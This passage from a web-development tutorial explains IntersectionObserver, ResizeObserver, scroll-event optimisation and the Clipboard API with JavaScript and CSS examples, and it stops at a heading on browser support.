const zeroSizeEl = document.createElement('div');
// width and height are 0
observer.observe(zeroSizeEl);
// isIntersecting will always be false
```

### Display: none Elements

Hidden elements don't trigger intersections:

```javascript
const hidden = document.querySelector('.hidden');
// CSS: .hidden { display: none; }
observer.observe(hidden);
// No intersection until display changes
```

### Iframe Boundaries

IntersectionObserver observes within the same browsing context. Cross-origin iframes require separate observers:

```javascript
// In parent window
const parentObserver = new IntersectionObserver(callback);
parentObserver.observe(iframe);  // Observes iframe element

// Inside iframe (separate observer needed)
const iframeObserver = new IntersectionObserver(callback);
iframeObserver.observe(iframeElement);
```

### Transform and Position Changes

CSS transforms don't trigger intersection recalculations by default:

```javascript
element.style.transform = 'translateY(100px)';
// May not immediately trigger intersection callback
```

[Inference] Browsers optimize by not recalculating on every transform. Layout changes (scrolling, resizing) trigger recalculation.

### Threshold Precision

Intersection ratios are floating-point numbers subject to precision limits:

```javascript
// Don't use exact equality
if (entry.intersectionRatio === 0.5) { }  // ❌ May miss due to precision

// Use ranges
if (Math.abs(entry.intersectionRatio - 0.5) < 0.01) { }  // ✓ Better
```

### Root Null vs Document Element

```javascript
// These are similar but not identical
const observer1 = new IntersectionObserver(callback, { root: null });
const observer2 = new IntersectionObserver(callback, { 
    root: document.documentElement 
});
```

`root: null` uses the viewport, which may differ from `document.documentElement` in terms of coordinate space and behavior with browser UI elements (address bar, etc.).

## Advanced Patterns

### Debounced Actions

While IntersectionObserver doesn't need throttling, you may want to debounce actions:

```javascript
const timers = new WeakMap();

const observer = new IntersectionObserver(entries => {
    entries.forEach(entry => {
        clearTimeout(timers.get(entry.target));
        
        const timer = setTimeout(() => {
            if (entry.isIntersecting) {
                performExpensiveOperation(entry.target);
            }
        }, 300);
        
        timers.set(entry.target, timer);
    });
});
```

### Progressive Enhancement

Provide fallback for browsers without support:

```javascript
if ('IntersectionObserver' in window) {
    const observer = new IntersectionObserver(callback);
    observer.observe(element);
} else {
    // Fallback: load immediately or use scroll events
    element.src = element.dataset.src;
}
```

### Multiple Observers with Different Configurations

Different elements may need different observation strategies:

```javascript
const eagerObserver = new IntersectionObserver(callback, {
    rootMargin: '200px'
});

const lazyObserver = new IntersectionObserver(callback, {
    rootMargin: '0px'
});

document.querySelectorAll('.eager-load').forEach(el => {
    eagerObserver.observe(el);
});

document.querySelectorAll('.lazy-load').forEach(el => {
    lazyObserver.observe(el);
});
```

### Bidirectional Infinite Scroll

```javascript
const topSentinel = document.getElementById('top-sentinel');
const bottomSentinel = document.getElementById('bottom-sentinel');

const observer = new IntersectionObserver(entries => {
    entries.forEach(entry => {
        if (!entry.isIntersecting) return;
        
        if (entry.target === topSentinel) {
            loadPreviousContent();
        } else if (entry.target === bottomSentinel) {
            loadNextContent();
        }
    });
});

observer.observe(topSentinel);
observer.observe(bottomSentinel);
```

### Intersection Ratio Progression

Track smooth transitions through visibility ranges:

```javascript
const observer = new IntersectionObserver(entries => {
    entries.forEach(entry => {
        const ratio = entry.intersectionRatio;
        const opacity = Math.min(ratio * 2, 1);  // Fade in faster
        entry.target.style.opacity = opacity;
    });
}, {
    threshold: Array.from({ length: 101 }, (_, i) => i / 100)
});
```

### Memory Management

Proper cleanup prevents memory leaks:

```javascript
class LazyLoader {
    constructor() {
        this.observer = new IntersectionObserver(
            this.handleIntersection.bind(this)
        );
        this.elements = new Set();
    }
    
    observe(element) {
        this.elements.add(element);
        this.observer.observe(element);
    }
    
    handleIntersection(entries) {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                this.load(entry.target);
                this.elements.delete(entry.target);
                this.observer.unobserve(entry.target);
            }
        });
    }
    
    destroy() {
        this.observer.disconnect();
        this.elements.clear();
    }
}
```

## Browser Compatibility Considerations

### Feature Detection

Always check for IntersectionObserver support:

```javascript
if (!('IntersectionObserver' in window)) {
    // Load polyfill or implement fallback
    loadIntersectionObserverPolyfill().then(() => {
        initializeObserver();
    });
} else {
    initializeObserver();
}
```

### Polyfill Integration

[Unverified] Polyfills are available but use less efficient fallback implementations based on scroll events and `getBoundingClientRect()`.

### Progressive Threshold Support

[Inference] Older implementations may have limits on the number of threshold values they can handle efficiently. Consider using fewer thresholds for broader compatibility.

## Debugging Strategies

### Logging Intersection Data

```javascript
const observer = new IntersectionObserver(entries => {
    entries.forEach(entry => {
        console.log({
            target: entry.target.id,
            isIntersecting: entry.isIntersecting,
            intersectionRatio: entry.intersectionRatio,
            boundingClientRect: entry.boundingClientRect,
            intersectionRect: entry.intersectionRect,
            time: entry.time
        });
    });
});
```

### Visual Debugging

Add visual indicators to observed elements:

```javascript
const observer = new IntersectionObserver(entries => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.style.outline = '3px solid green';
        } else {
            entry.target.style.outline = '3px solid red';
        }
    });
});
```

### Tracking Observation State

```javascript
const observedElements = new WeakMap();

function observeElement(element) {
    observer.observe(element);
    observedElements.set(element, {
        observedAt: Date.now(),
        intersectionCount: 0
    });
}

const observer = new IntersectionObserver(entries => {
    entries.forEach(entry => {
        const state = observedElements.get(entry.target);
        if (state) {
            state.intersectionCount++;
            state.lastIntersection = Date.now();
        }
    });
});
```

---

## ResizeObserver

### Core Mechanics

`ResizeObserver` monitors changes to element dimensions and reports them asynchronously. Unlike listening for window resize events, ResizeObserver tracks individual elements regardless of what causes their size to change—CSS modifications, content updates, layout shifts, or viewport changes.

```javascript
const observer = new ResizeObserver((entries) => {
  entries.forEach(entry => {
    console.log('Element:', entry.target);
    console.log('New size:', entry.contentRect);
  });
});

observer.observe(element);
```

The callback executes after layout but before paint, giving you opportunity to make DOM changes without triggering additional reflows **[Inference]** in many cases, though complex changes may still cause subsequent layout recalculations.

### Entry Properties

Each `ResizeObserverEntry` provides multiple size measurements:

```javascript
const observer = new ResizeObserver((entries) => {
  entries.forEach(entry => {
    // Legacy property - content box dimensions
    const { width, height } = entry.contentRect;
    
    // Detailed box sizing information
    const contentBoxSize = entry.contentBoxSize[0];
    const borderBoxSize = entry.borderBoxSize[0];
    const devicePixelContentBoxSize = entry.devicePixelContentBoxSize[0];
    
    console.log('Content box:', contentBoxSize.inlineSize, contentBoxSize.blockSize);
    console.log('Border box:', borderBoxSize.inlineSize, borderBoxSize.blockSize);
  });
});
```

**Box Model Distinctions**:

- `contentRect`: Content area only (excludes padding, border, scrollbar)
- `contentBoxSize`: Content area with logical dimensions (inline/block)
- `borderBoxSize`: Includes padding and border
- `devicePixelContentBoxSize`: Physical pixel dimensions for canvas/WebGL rendering

The `*BoxSize` arrays contain objects with `inlineSize` and `blockSize` properties, which respect writing modes (horizontal/vertical text flow).

### Box Sizing Options

Specify which box model to observe:

```javascript
observer.observe(element, { box: 'content-box' }); // Default
observer.observe(element, { box: 'border-box' });
observer.observe(element, { box: 'device-pixel-content-box' });
```

**`content-box`**: Excludes padding and border—useful for tracking actual content space.

**`border-box`**: Includes padding and border—matches `box-sizing: border-box` CSS and `offsetWidth`/`offsetHeight`.

**`device-pixel-content-box`**: Physical pixels for high-DPI displays—critical for canvas rendering where CSS pixels don't match device pixels.

```javascript
// Canvas resolution matching
const observer = new ResizeObserver((entries) => {
  const entry = entries[0];
  const dpr = window.devicePixelRatio || 1;
  
  if (entry.devicePixelContentBoxSize) {
    // Use actual device pixels
    const { inlineSize, blockSize } = entry.devicePixelContentBoxSize[0];
    canvas.width = inlineSize;
    canvas.height = blockSize;
  } else {
    // Fallback calculation
    canvas.width = entry.contentRect.width * dpr;
    canvas.height = entry.contentRect.height * dpr;
  }
});

observer.observe(canvas, { box: 'device-pixel-content-box' });
```

### Observation Lifecycle

**Initial Notification**

The callback fires immediately after observation begins, even if size hasn't changed:

```javascript
const observer = new ResizeObserver((entries) => {
  console.log('Fired'); // Logs immediately
});

observer.observe(element); // Triggers callback synchronously on next frame
```

**[Inference]** This initial firing enables you to establish baseline dimensions without separate measurement code.

**Disconnection and Cleanup**

```javascript
// Stop observing specific element
observer.unobserve(element);

// Stop all observations
observer.disconnect();

// Resume observing
observer.observe(element);
```

Always disconnect observers when components unmount or elements are removed:

```javascript
// React example pattern
useEffect(() => {
  const observer = new ResizeObserver(callback);
  observer.observe(elementRef.current);
  
  return () => observer.disconnect(); // Cleanup
}, []);
```

### Performance Considerations

**Callback Frequency**

ResizeObserver uses requestAnimationFrame timing internally **[Inference]** based on typical browser implementation patterns. Callbacks execute at most once per frame, batching multiple size changes.

```javascript
// All three changes trigger single callback
element.style.width = '100px';
element.style.padding = '20px';
element.style.border = '5px solid black';

// Callback receives final dimensions after all changes
```

**Debouncing Not Required**

Unlike window resize events, ResizeObserver already batches changes efficiently. Additional debouncing adds latency without benefit **[Inference]** for most use cases:

```javascript
// Unnecessary pattern
const observer = new ResizeObserver(
  debounce((entries) => {
    // Already batched by browser
  }, 100)
);
```

Reserve explicit debouncing for expensive operations triggered by resize:

```javascript
const observer = new ResizeObserver((entries) => {
  // Immediate lightweight updates
  updateDimensions(entries);
  
  // Debounce heavy recalculation
  debouncedExpensiveOperation();
});
```

**Recursive Resize Prevention**

Modifying observed element dimensions within the callback can trigger observation loops:

```javascript
// Dangerous pattern
const observer = new ResizeObserver((entries) => {
  entries.forEach(entry => {
    // Modifying observed element creates loop
    entry.target.style.height = entry.contentRect.width + 'px';
  });
});
```

Browsers detect and prevent infinite loops, logging errors after threshold exceeded:

```
ResizeObserver loop completed with undelivered notifications
```

**[Inference]** This error typically indicates you're modifying observed elements in ways that create feedback cycles. Solutions:

- Modify different (unobserved) elements
- Use flags to prevent recursive updates
- Observe parent instead of element you're modifying

```javascript
// Safe pattern - modify child, observe parent
const observer = new ResizeObserver((entries) => {
  const parent = entries[0].target;
  const child = parent.querySelector('.child');
  
  // Modify child based on parent size
  child.style.height = parent.clientWidth * 0.5 + 'px';
});

observer.observe(parent);
```

### Multi-Element Observation

Single observer can track multiple elements efficiently:

```javascript
const observer = new ResizeObserver((entries) => {
  entries.forEach(entry => {
    // Identify which element changed
    if (entry.target.matches('.sidebar')) {
      handleSidebarResize(entry);
    } else if (entry.target.matches('.content')) {
      handleContentResize(entry);
    }
  });
});

document.querySelectorAll('.sidebar, .content').forEach(el => {
  observer.observe(el);
});
```

This approach reduces observer overhead compared to creating separate observers per element **[Inference]**.

### Container Queries Relationship

ResizeObserver provides programmatic access to information CSS Container Queries use declaratively:

```javascript
// JavaScript approach
const observer = new ResizeObserver((entries) => {
  entries.forEach(entry => {
    if (entry.contentRect.width < 400) {
      entry.target.classList.add('narrow');
    } else {
      entry.target.classList.remove('narrow');
    }
  });
});

observer.observe(container);
```

```css
/* CSS approach (modern browsers) */
@container (max-width: 400px) {
  .element {
    /* Styles for narrow container */
  }
}
```

**[Inference]** Prefer CSS Container Queries for style-only responsive behavior. Use ResizeObserver when you need:

- Programmatic logic beyond style application
- Dynamic calculations based on dimensions
- Canvas/WebGL rendering updates
- Third-party component integration
- Browser compatibility with older environments

### Common Patterns

**Responsive Typography**

```javascript
const observer = new ResizeObserver((entries) => {
  const width = entries[0].contentRect.width;
  const fontSize = Math.max(16, width / 30);
  
  entries[0].target.style.fontSize = fontSize + 'px';
});

observer.observe(textContainer);
```

**Viewport-Aware Components**

```javascript
// Detect when element becomes visible/hidden
const observer = new ResizeObserver((entries) => {
  entries.forEach(entry => {
    const isVisible = entry.contentRect.width > 0 && entry.contentRect.height > 0;
    
    if (isVisible) {
      initializeComponent(entry.target);
    } else {
      cleanupComponent(entry.target);
    }
  });
});
```

**Aspect Ratio Maintenance**

```javascript
const observer = new ResizeObserver((entries) => {
  const { width } = entries[0].contentRect;
  const targetRatio = 16 / 9;
  
  entries[0].target.style.height = (width / targetRatio) + 'px';
});

observer.observe(videoContainer);
```

Note: CSS `aspect-ratio` property handles this declaratively in modern browsers, making ResizeObserver unnecessary for simple aspect ratio constraints.

**Chart/Visualization Updates**

```javascript
const observer = new ResizeObserver((entries) => {
  const { width, height } = entries[0].contentRect;
  
  chart.resize({
    width: width,
    height: height
  });
  
  chart.render();
});

observer.observe(chartContainer);
```

### Error Handling

ResizeObserver callbacks can throw errors without disrupting observation:

```javascript
const observer = new ResizeObserver((entries) => {
  try {
    entries.forEach(entry => {
      riskyOperation(entry);
    });
  } catch (error) {
    console.error('Resize handler error:', error);
    // Observer continues functioning
  }
});
```

Uncaught errors in callbacks log to console but don't stop the observer **[Inference]** based on typical browser error handling for observer APIs.

### Intersection with Other APIs

**Combined with IntersectionObserver**

```javascript
const resizeObserver = new ResizeObserver((entries) => {
  updateDimensions(entries);
});

const intersectionObserver = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      // Only observe size when visible
      resizeObserver.observe(entry.target);
    } else {
      resizeObserver.unobserve(entry.target);
    }
  });
});

intersectionObserver.observe(element);
```

This pattern optimizes performance by only tracking sizes of visible elements.

**MutationObserver Coordination**

```javascript
// Watch for element additions
const mutationObserver = new MutationObserver((mutations) => {
  mutations.forEach(mutation => {
    mutation.addedNodes.forEach(node => {
      if (node.nodeType === 1 && node.matches('.observable')) {
        resizeObserver.observe(node);
      }
    });
  });
});

mutationObserver.observe(container, { childList: true, subtree: true });
```

### Browser Compatibility

ResizeObserver is widely supported in modern browsers (Chrome 64+, Firefox 69+, Safari 13.1+, Edge 79+). For older environments, polyfills exist but have limitations:

- May use polling instead of native observation
- Higher performance overhead
- Less accurate timing
- Missing `devicePixelContentBoxSize` support

**[Unverified]** Polyfill behavior and performance characteristics vary by implementation.

### Memory Leak Prevention

Observers maintain strong references to observed elements:

```javascript
// Memory leak - observer prevents garbage collection
const elements = document.querySelectorAll('.dynamic');
const observer = new ResizeObserver(callback);

elements.forEach(el => observer.observe(el));

// Elements removed from DOM but still referenced by observer
elements.forEach(el => el.remove());

// Proper cleanup
observer.disconnect(); // Releases all references
```

In long-running applications, always disconnect observers when elements are no longer needed.

---

## Scroll Events and Optimization

### Event Firing Characteristics

Scroll events fire asynchronously during scrolling, with frequency varying by browser, input device, and scrolling velocity. Mouse wheel scrolling typically triggers fewer events than trackpad gestures or touch scrolling. A single scroll gesture can generate dozens to hundreds of events.

```javascript
let scrollCount = 0;
window.addEventListener('scroll', () => {
  scrollCount++;
  console.log(`Scroll event #${scrollCount}`);
});
```

[Inference: The exact event frequency depends on browser implementation, hardware capabilities, and system performance.]

The browser doesn't guarantee consistent intervals between scroll events. Event density increases during active scrolling and may continue briefly after user input stops due to momentum scrolling on certain platforms.

### Passive Event Listeners

Passive listeners prevent `preventDefault()` calls, allowing the browser to scroll immediately without waiting for JavaScript execution:

```javascript
// Non-passive (default for scroll in some contexts)
element.addEventListener('scroll', handler);

// Explicit passive
element.addEventListener('scroll', handler, { passive: true });

// Cannot prevent default
element.addEventListener('scroll', (e) => {
  e.preventDefault(); // No effect with passive: true
}, { passive: true });
```

Passive listeners improve scroll performance by eliminating the browser's need to wait for JavaScript to determine if scrolling should be prevented. Modern browsers default scroll listeners to passive on `document`, `window`, and `body`.

[Unverified: The specific default passive behavior varies across browser versions and may change.]

Performance gains from passive listeners are most noticeable on touch-enabled devices where scroll blocking historically caused significant latency.

### Throttling Patterns

Throttling limits handler execution frequency by enforcing minimum time intervals between invocations:

```javascript
function throttle(func, delay) {
  let lastCall = 0;
  return function(...args) {
    const now = Date.now();
    if (now - lastCall >= delay) {
      lastCall = now;
      func.apply(this, args);
    }
  };
}

window.addEventListener('scroll', throttle(() => {
  console.log('Throttled scroll handler');
}, 100)); // Execute at most once per 100ms
```

Throttling guarantees execution during active scrolling but may miss the final scroll position if the last event falls within the throttle window. For scroll-dependent UI updates, this can cause desynchronization between actual and perceived scroll position.

Leading-edge throttling executes immediately on first invocation, then enforces the delay:

```javascript
function throttleLeading(func, delay) {
  let timeout = null;
  let lastCall = 0;
  
  return function(...args) {
    const now = Date.now();
    
    if (now - lastCall >= delay) {
      func.apply(this, args);
      lastCall = now;
    }
  };
}
```

Trailing-edge throttling ensures the handler runs with the final state after scrolling stops, preventing state desynchronization.

### Debouncing Patterns

Debouncing delays execution until events stop firing for a specified duration:

```javascript
function debounce(func, delay) {
  let timeout;
  return function(...args) {
    clearTimeout(timeout);
    timeout = setTimeout(() => {
      func.apply(this, args);
    }, delay);
  };
}

window.addEventListener('scroll', debounce(() => {
  console.log('Scroll stopped');
}, 150));
```

Debounced handlers execute only after scrolling pauses, making them suitable for expensive operations that don't require continuous updates—like fetching data based on scroll position or recalculating complex layouts.

Combining leading and trailing debouncing provides immediate feedback plus final execution:

```javascript
function debounceLeadingTrailing(func, delay) {
  let timeout;
  let lastCall = 0;
  
  return function(...args) {
    const now = Date.now();
    const callNow = now - lastCall > delay;
    
    clearTimeout(timeout);
    
    if (callNow) {
      func.apply(this, args);
      lastCall = now;
    }
    
    timeout = setTimeout(() => {
      func.apply(this, args);
      lastCall = Date.now();
    }, delay);
  };
}
```

### requestAnimationFrame Scheduling

Coordinating scroll handlers with animation frames prevents redundant calculations within a single render cycle:

```javascript
let ticking = false;

function handleScroll() {
  const scrollPos = window.scrollY;
  // Perform DOM reads and writes
  console.log('Scroll position:', scrollPos);
  ticking = false;
}

window.addEventListener('scroll', () => {
  if (!ticking) {
    requestAnimationFrame(handleScroll);
    ticking = true;
  }
});
```

This pattern ensures the handler runs at most once per frame, synchronized with browser rendering. Multiple scroll events within a frame trigger only one handler execution, reducing computational overhead while maintaining visual smoothness.

The `ticking` flag prevents queuing multiple animation frame callbacks. Without it, rapid scroll events could schedule numerous callbacks, negating the optimization benefit.

### Read-Write Separation

Separating DOM reads from writes prevents layout thrashing—the performance penalty from interleaved read-write operations that force synchronous layout recalculation:

```javascript
// Bad: Interleaved reads and writes
function badScrollHandler() {
  elements.forEach(el => {
    const top = el.offsetTop; // Read (forces layout)
    el.style.transform = `translateY(${scrollY - top}px)`; // Write
    const height = el.offsetHeight; // Read (forces layout again)
    el.style.opacity = height / 1000; // Write
  });
}

// Good: Batch reads, then writes
function goodScrollHandler() {
  // Batch all reads
  const measurements = elements.map(el => ({
    element: el,
    top: el.offsetTop,
    height: el.offsetHeight
  }));
  
  // Batch all writes
  measurements.forEach(({ element, top, height }) => {
    element.style.transform = `translateY(${scrollY - top}px)`;
    element.style.opacity = height / 1000;
  });
}
```

Each layout-triggering property access after a DOM write forces the browser to recalculate layout. Batching eliminates redundant calculations by grouping operations of the same type.

### IntersectionObserver Alternative

IntersectionObserver provides scroll-related functionality without continuous event monitoring:

```javascript
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      console.log('Element entered viewport');
      entry.target.classList.add('visible');
    }
  });
}, {
  threshold: 0.5,
  rootMargin: '0px'
});

document.querySelectorAll('.observe-me').forEach(el => {
  observer.observe(el);
});
```

IntersectionObserver callbacks execute asynchronously and are automatically optimized by the browser. They don't fire continuously during scrolling—only when visibility state changes. This dramatically reduces CPU usage compared to scroll event polling.

The observer handles multiple elements efficiently through a single callback, making it superior to per-element scroll calculations for visibility detection, lazy loading, or viewport-based animations.

### CSS-Based Scroll Optimizations

CSS properties enable scroll effects without JavaScript:

```css
/* Smooth scrolling without JS */
html {
  scroll-behavior: smooth;
}

/* GPU-accelerated parallax */
.parallax {
  transform: translateZ(0);
  will-change: transform;
}

/* Scroll-snap points */
.container {
  scroll-snap-type: y mandatory;
  overflow-y: scroll;
}

.section {
  scroll-snap-align: start;
}
```

CSS animations and transitions run on the compositor thread when using transform and opacity properties, bypassing main thread congestion from JavaScript execution.

[Inference: Compositor thread optimization occurs when specific CSS properties are used under certain conditions, but the exact criteria may vary.]

The `will-change` property hints to the browser about upcoming changes, enabling preemptive optimization. Overusing `will-change` can consume excessive memory, so apply it selectively to elements with active scroll effects.

### Scroll Timeline API

Scroll-driven animations link animation progress directly to scroll position without JavaScript:

```css
@keyframes fade-in {
  from { opacity: 0; }
  to { opacity: 1; }
}

.element {
  animation: fade-in linear;
  animation-timeline: scroll();
  animation-range: entry 0% entry 100%;
}
```

[Unverified: Scroll Timeline API browser support is limited and may require feature detection or progressive enhancement.]

JavaScript access to scroll timelines:

```javascript
const element = document.querySelector('.element');
element.style.animationTimeline = 'scroll()';
```

Scroll-linked animations execute on the compositor thread when possible, delivering 60fps performance without main thread involvement.

### Virtual Scrolling Implementation

Virtual scrolling renders only visible items, dramatically improving performance for large lists:

```javascript
class VirtualScroller {
  constructor(container, items, itemHeight) {
    this.container = container;
    this.items = items;
    this.itemHeight = itemHeight;
    this.visibleCount = Math.ceil(container.clientHeight / itemHeight) + 1;
    this.startIndex = 0;
    
    this.container.style.height = `${items.length * itemHeight}px`;
    this.container.style.position = 'relative';
    
    this.container.addEventListener('scroll', () => {
      this.updateVisibleItems();
    });
    
    this.updateVisibleItems();
  }
  
  updateVisibleItems() {
    const scrollTop = this.container.scrollTop;
    this.startIndex = Math.floor(scrollTop / this.itemHeight);
    const endIndex = Math.min(
      this.startIndex + this.visibleCount,
      this.items.length
    );
    
    this.render(this.startIndex, endIndex);
  }
  
  render(start, end) {
    const fragment = document.createDocumentFragment();
    
    for (let i = start; i < end; i++) {
      const item = document.createElement('div');
      item.style.position = 'absolute';
      item.style.top = `${i * this.itemHeight}px`;
      item.style.height = `${this.itemHeight}px`;
      item.textContent = this.items[i];
      fragment.appendChild(item);
    }
    
    this.container.innerHTML = '';
    this.container.appendChild(fragment);
  }
}
```

Virtual scrolling maintains constant DOM size regardless of dataset length. Rendering 100,000 items requires the same resources as rendering 20 visible items.

[Inference: The performance characteristics depend on item complexity and rendering logic efficiency.]

### Scroll Anchoring

Browsers automatically adjust scroll position when content above the viewport changes size:

```css
/* Disable scroll anchoring */
.container {
  overflow-anchor: none;
}

/* Enable (default) */
.container {
  overflow-anchor: auto;
}
```

[Inference: Scroll anchoring behavior aims to prevent unexpected jumps but may occasionally conflict with custom scroll management.]

Scroll anchoring selects an anchor node within the viewport and maintains its position when layout changes occur. This prevents the jarring experience of content shifting unexpectedly during dynamic loading.

JavaScript can manually manage scroll position when disabling anchoring:

```javascript
const scrollPos = container.scrollTop;
// Modify content above viewport
container.scrollTop = scrollPos + heightDifference;
```

### Overscroll Behavior

Control scroll chaining and overscroll effects:

```css
.modal {
  overscroll-behavior: contain; /* Prevent scroll chaining */
}

.disable-pull-refresh {
  overscroll-behavior-y: none; /* Disable pull-to-refresh */
}

.horizontal-scroller {
  overscroll-behavior-x: contain;
  overscroll-behavior-y: auto;
}
```

Overscroll containment prevents parent scrollers from activating when a child scroller reaches its boundary. This is essential for modal dialogs, fixed sidebars, and nested scrollable regions.

The `none` value disables both scroll chaining and overscroll visual effects (bounce, glow). Use cautiously as it may conflict with platform conventions.

### Scroll Restoration

Browser scroll restoration behavior for navigation:

```javascript
// Disable automatic scroll restoration
if ('scrollRestoration' in history) {
  history.scrollRestoration = 'manual';
}

// Save scroll position before navigation
window.addEventListener('beforeunload', () => {
  sessionStorage.setItem('scrollPos', window.scrollY);
});

// Restore scroll position
window.addEventListener('load', () => {
  const scrollPos = sessionStorage.getItem('scrollPos');
  if (scrollPos) {
    window.scrollTo(0, parseInt(scrollPos, 10));
  }
});
```

Manual scroll restoration provides control over timing and position, useful for single-page applications or pages with dynamic content that affects scroll calculations.

[Inference: Browser scroll restoration mechanisms vary and may restore position at different points in the page load lifecycle.]

### Momentum Scrolling

Enable inertial scrolling on touch devices:

```css
.scrollable {
  -webkit-overflow-scrolling: touch; /* Legacy iOS */
  overflow: auto;
}
```

[Unverified: `-webkit-overflow-scrolling` is deprecated in modern Safari versions but may still be required for older iOS devices.]

Momentum scrolling creates the native "flick" behavior where scrolling continues after touch release. Without it, scrolling stops immediately when touch ends, feeling unnatural on mobile devices.

Modern browsers implement momentum scrolling by default for `overflow: auto` and `overflow: scroll` elements.

### Performance Monitoring

Measure scroll performance impact:

```javascript
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    if (entry.duration > 16.67) { // Longer than one frame at 60fps
      console.warn('Slow scroll handler:', entry.duration);
    }
  }
});

observer.observe({ entryTypes: ['measure'] });

window.addEventListener('scroll', () => {
  performance.mark('scroll-start');
  
  // Handler logic
  
  performance.mark('scroll-end');
  performance.measure('scroll-handler', 'scroll-start', 'scroll-end');
});
```

[Inference: Frame budget calculations assume 60fps target; actual requirements may vary based on display refresh rate.]

Long Task API identifies handlers blocking the main thread:

```javascript
const observer = new PerformanceObserver((list) => {
  list.getEntries().forEach((entry) => {
    console.warn('Long task detected:', entry.duration);
  });
});

observer.observe({ entryTypes: ['longtask'] });
```

Tasks exceeding 50ms appear as long tasks, indicating potential jank during scrolling.

### Scroll-Linked Positioning

CSS `position: sticky` provides scroll-based positioning without JavaScript:

```css
.header {
  position: sticky;
  top: 0;
  z-index: 100;
}

.sidebar {
  position: sticky;
  top: 20px;
  align-self: flex-start; /* Required in flex containers */
}
```

Sticky positioning switches between relative and fixed based on scroll position, creating headers, sidebars, and table headers that remain visible during scrolling. The browser handles position calculation natively, delivering better performance than JavaScript alternatives.

[Inference: Sticky positioning performance characteristics depend on browser implementation and may involve compositor thread optimization.]

Sticky elements respect their containing block boundaries, unsticking when reaching the container's end. This enables section-based sticky headers that replace each other naturally.

### Scroll Event Coalescing

Browsers may coalesce multiple scroll events into single callback executions:

```javascript
let eventCount = 0;
let callbackCount = 0;

window.addEventListener('scroll', () => {
  eventCount++;
  
  queueMicrotask(() => {
    callbackCount++;
    if (eventCount > callbackCount) {
      console.log('Events coalesced');
    }
  });
});
```

[Inference: Event coalescing behavior is browser-specific and may vary based on system load and event frequency.]

Coalescing reduces callback execution overhead during rapid scrolling. Applications requiring precise per-event handling may need to account for this behavior when timing-sensitive operations depend on every scroll event.

---

## Clipboard API

### API Structure

The Clipboard API provides asynchronous access to the system clipboard through `navigator.clipboard`. All methods return Promises and require user permission or interaction. The API consists of four primary methods: `writeText()`, `readText()`, `write()`, and `read()`.

### Permission Model

Clipboard access requires permissions from the Permissions API. Write operations generally auto-grant during user gestures (clicks, key presses). Read operations require explicit user permission.

```javascript
const result = await navigator.permissions.query({name: 'clipboard-read'});
// result.state: 'granted', 'denied', or 'prompt'

const writeResult = await navigator.permissions.query({name: 'clipboard-write'});
```

**[Inference]** Browsers typically require user interaction for clipboard operations to prevent abuse. Reading clipboard content particularly requires active user consent to protect privacy.

### Text Operations

**Writing text**: `writeText()` copies plain text to the clipboard.

```javascript
await navigator.clipboard.writeText('Text to copy');
```

**Reading text**: `readText()` retrieves plain text content. This typically triggers a permission prompt on first use.

```javascript
const text = await navigator.clipboard.readText();
console.log(text);
```

Both methods throw exceptions if permission is denied or the operation fails. Wrap calls in try-catch blocks.

```javascript
try {
  await navigator.clipboard.writeText('content');
} catch (err) {
  console.error('Failed to copy:', err);
}
```

### Rich Content Operations

The `write()` and `read()` methods handle multiple MIME types simultaneously, enabling rich content like images, HTML, and custom formats.

**Writing rich content**: Use `ClipboardItem` objects containing multiple representations.

```javascript
const blob = new Blob(['<p>HTML content</p>'], {type: 'text/html'});
const plainText = new Blob(['Plain text'], {type: 'text/plain'});

const item = new ClipboardItem({
  'text/html': blob,
  'text/plain': plainText
});

await navigator.clipboard.write([item]);
```

**Writing images**:

```javascript
const response = await fetch('image.png');
const blob = await response.blob();

const item = new ClipboardItem({
  [blob.type]: blob
});

await navigator.clipboard.write([item]);
```

**Reading rich content**: Returns an array of `ClipboardItem` objects.

```javascript
const items = await navigator.clipboard.read();

for (const item of items) {
  console.log(item.types); // Array of available MIME types
  
  if (item.types.includes('text/html')) {
    const blob = await item.getType('text/html');
    const html = await blob.text();
    console.log(html);
  }
  
  if (item.types.includes('image/png')) {
    const blob = await item.getType('image/png');
    const url = URL.createObjectURL(blob);
    // Use url with <img> tag
  }
}
```

### ClipboardItem API

`ClipboardItem` objects encapsulate clipboard data with multiple representations. Each item maps MIME types to Blob or Promise-returning functions.

**Delayed rendering**: Provide functions that return Promises for lazy data generation.

```javascript
const item = new ClipboardItem({
  'text/plain': new Promise(async (resolve) => {
    const data = await generateExpensiveData();
    resolve(new Blob([data], {type: 'text/plain'}));
  })
});
```

**Presentation styles**: [Unverified] Some implementations support `presentationStyle` to indicate inline vs attachment handling.

```javascript
const item = new ClipboardItem(
  {'text/plain': blob},
  {presentationStyle: 'inline'}
);
```

### Copy and Paste Events

The older synchronous `document.execCommand()` approach still works through cut, copy, and paste events, though the Clipboard API is preferred.

**Copy event**:

```javascript
document.addEventListener('copy', (e) => {
  e.preventDefault();
  e.clipboardData.setData('text/plain', 'Custom text');
  e.clipboardData.setData('text/html', '<b>Custom HTML</b>');
});
```

**Paste event**:

```javascript
document.addEventListener('paste', (e) => {
  e.preventDefault();
  const text = e.clipboardData.getData('text/plain');
  const html = e.clipboardData.getData('text/html');
  
  // Access files
  const files = e.clipboardData.files;
  for (const file of files) {
    console.log(file.name, file.type);
  }
});
```

**Cut event**: Similar to copy but typically removes selected content.

### Custom MIME Types

Applications can use custom MIME types for proprietary data formats, enabling richer copy-paste between instances of the same application.

```javascript
const customData = JSON.stringify({id: 123, data: 'value'});
const blob = new Blob([customData], {type: 'application/x-myapp-data'});

const item = new ClipboardItem({
  'application/x-myapp-data': blob,
  'text/plain': new Blob(['Fallback text'], {type: 'text/plain'})
});

await navigator.clipboard.write([item]);
```

Include fallback MIME types for compatibility with applications that don't understand custom formats.

### Security Restrictions

**User gesture requirement**: Clipboard write operations typically require active user interaction (click, keypress) within a recent timeframe. The exact timing varies by browser.

**Origin restrictions**: Clipboard access is origin-bound. Cross-origin iframes have restricted access unless explicitly permitted through Permissions Policy.

```html
<iframe src="..." allow="clipboard-read; clipboard-write"></iframe>
```

**HTTPS requirement**: The Clipboard API generally requires secure contexts (HTTPS), though localhost is typically exempted.

**Sanitization**: [Inference] Browsers may sanitize clipboard content, particularly HTML, to remove potentially dangerous elements like scripts or event handlers.

### Browser Support and Fallbacks

